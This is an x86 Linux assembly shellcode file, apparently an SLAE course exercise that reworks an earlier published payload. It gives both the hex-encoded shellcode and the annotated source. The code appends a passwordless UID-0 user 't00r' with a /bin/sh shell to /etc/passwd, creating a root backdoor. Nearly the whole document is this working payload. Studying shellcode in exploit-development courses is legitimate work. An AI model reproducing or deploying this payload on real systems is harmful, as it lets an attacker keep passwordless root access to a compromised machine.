; Original Title:	Agrega la linea "t00r::0:0::/:/bin/sh" en /etc/passwd - 82 bytes
; Original Author:	Jean Pascal Pereira <pereira@secbiz.de>
; Original Web:	http://0xffe4.org
;
; ======================================================================================
;
; Title: Add "t00r::0:0::/:/bin/sh" to /etc/passwd - 86 bytes
; Shellcode : \x31\xed\x99\x31\xc0\x50\xeb\x24\x5b\xb1\x02\xb0\x05\xcd\x80\x89\xc3\x87\xd1\x31\xc9\x04\x10\xcd\x80\x51\xeb\x21\x8d\x41\x04\x59\x80\xc2\x12\xcd\x80\x2c\x0e\xcd\x80\x40\xcd\x80\xe8\xd7\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00\xe8\xda\xff\xff\xff\x74\x30\x30\x72\x3a\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68
; Author: thryb <https://www.github.com/thryb/SLAE-770>
; SLAE ID: SLAE-770
;


global _start
section .text
_start:

    xor    ebp, ebp
    cdq
    xor    eax,eax
    push   eax

    jmp short file
    ;push   0x64777373
    ;push   0x61702f63
    ;push   0x74652f2f
    ; replaced with jmp call pop technic @ file

main:
    ;mov  ebx, esp
    ; replaced with
    ; --- start ---
    pop ebx
    ; --- end ---
    
    ;lea    ecx,[eax+0x2]
    ;lea    eax,[ieax+0x5]
    ; replaced with
    ; --- start ---
    mov    cl, 0x2
    mov    al, 0x5
    ; --- end --- 

    int    0x80
    mov    ebx,eax
    xchg   edx,ecx
    xor    ecx,ecx

    ;mov    al,0x13
    ; replaced with
    ; --- start ---
    add    al, 0x10
    ; --- end ---

    int    0x80

    push   ecx
    jmp short pass ; new

main2:
    ;push   0x68732f6e
    ;push   0x69622f3a
    ;push   0x2f3a3a30
    ;push   0x3a303a3a
    ;push   0x72303074
    ; replaced with jmp call pop technique @ pass


    lea    eax,[ecx+0x4]   

    ;mov    ecx,esp
    ; replaced with
    ; --- start ---
    pop    ecx   
    ; --- end ---
 
    ;mov    dl,0x14
    ; replaced with
    ; --- start ---
    add    dl, 0x12
    ; --- end ---

    int    0x80
    
    ;xor    eax,eax
    ;mov    al,0x6
    ; replaced with
    ; --- start ---
    sub    al, 0xE
    ; --- end ---

    int    0x80
    inc    eax
    int    0x80


file:
call main
pwd: db "/etc/passwd", 0x00

pass:
call main2
user: db "t00r::0:0::/:/bin/sh"
